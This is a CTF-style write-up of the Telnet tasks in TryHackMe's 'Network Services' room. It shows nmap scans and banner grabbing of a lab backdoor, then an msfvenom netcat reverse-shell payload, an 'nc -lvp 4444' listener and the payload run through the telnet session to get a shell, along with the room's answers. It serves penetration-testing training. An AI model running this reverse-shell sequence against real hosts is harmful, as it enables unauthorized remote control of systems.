![](https://miro.medium.com/max/1400/1*bGG7eew9hvMfGMBnv77LJg.png)

This is a writeup for [Network Services](https://tryhackme.com/room/networkservices) room on THM

**Enumerating Telnet**
======================

Spin up your target machine and let‚Äôs do a quick nmap scan to see what ports are open

```
#nmap -Pn -p- 10.10.37.92  
Starting Nmap 7.92 ( [https://nmap.org](https://nmap.org) ) at 2022-02-23 09:10 EST  
Nmap scan report for 10.10.37.92  
Host is up (0.42s latency).  
Not shown: 65534 closed tcp ports (reset)  
PORT     STATE SERVICE  
8012/tcp open  unknown
```

1.  How many **ports** are open on the target machine?

```
1
```

2\. What **port** is this?

```
8012
```

3\. This port is unassigned, but still lists the **protocol** it‚Äôs using, what protocol is this?

```
TCP
```

Rerunning the nmap scan without -p-

```
sudo nmap -Pn 10.10.37.92      
Starting Nmap 7.92 ( [https://nmap.org](https://nmap.org) ) at 2022-02-23 09:10 EST  
Nmap scan report for 10.10.37.92  
Host is up (0.42s latency).  
All 1000 scanned ports on 10.10.37.92 are in ignored states.  
Not shown: 1000 closed tcp ports (reset)Nmap done: 1 IP address (1 host up) scanned in 6.59 seconds
```

4\. Now re-run the **nmap** scan, without the **\-p-** tag, how many ports show up as open?

```
0
```

**Telnet Banner Grabbing**

If we try to connect to the IP and port the service will print the banner

```
sudo telnet 10.10.37.92 8012                  
\[sudo\] password for kali:   
Trying 10.10.37.92...  
Connected to 10.10.37.92.  
Escape character is '^\]'.  
SKIDY'S BACKDOOR. Type .HELP to view commands
```

5\. Based on the title returned to us, what do we think this port could be **used for**?

```
a backdoor
```

6\. Who could it belong to? Gathering possible **usernames** is an important step in enumeration.

```
skidy
```

Exploiting Telnet
=================

Read the room notes from task 7 üëÄ

2\. Great! It‚Äôs an open telnet connection! What welcome message do we receive?

```
SKIDY'S BACKDOOR.
```

3.Let‚Äôs try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)

```
N
```![](https://miro.medium.com/max/830/1*6uPqzgedPfaAVpuhxciLfg.png)

Start a tcpdump listener on your local machine.

**If using your own machine with the OpenVPN connection, use:**

*   `sudo tcpdump ip proto \\icmp -i tun0`

**If using the AttackBox, use:**

*   `sudo tcpdump ip proto \\icmp -i eth0`

This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.

![](https://miro.medium.com/max/1400/1*WyAPD2F8xt2bQQfnY1kRdQ.png)TCP DUMP

4\. Now, use the command **‚Äúping \[local THM ip\] -c 1‚Äù** through the telnet session to see if we‚Äôre able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)

```
Y
```

We‚Äôre going to generate a reverse shell payload using msfvenom. This will generate and encode a netcat reverse shell for us. Here‚Äôs our syntax:

**‚Äúmsfvenom -p cmd/unix/reverse\_netcat lhost=\[local tun0 ip\] lport=4444 R‚Äù**

\-p = payload

lhost = our local host IP address (this is **your** machine‚Äôs IP address)

lport = the port to listen on (this is the port on **your** machine)

R = export the payload in raw format

What word does the generated payload start with?

![](https://miro.medium.com/max/1400/1*3OlqaT6UkXU3uI0hCMxiAQ.png)

5\. What word does the generated payload start with?

```
mkfifo
```

6.  
Perfect. We‚Äôre nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using:

**‚Äúnc -lvp \[listening port\]‚Äù**

What would the command look like for the listening port we selected in our payload?

```
nc -lvp 4444
```

Now copy paste the payload generated by the msfvenom in the telnet session

.RUN <payload>

![](https://miro.medium.com/max/1400/1*c7QS94Lq6HhaKy-JYhQS4w.png)

And it will give you a reverse shell

![](https://miro.medium.com/max/1086/1*dwvcgk-cRHjWIMCcfRrAKA.png)

Cat flag.txt to answer the last question

Thank you for reading.

üêæWriteup on Network Services FTP here [https://richardphilipsroy.medium.com/network-services-ftp-tryhackme-6c22406d1444](https://medium.com/network-services-ftp-tryhackme-6c22406d1444)
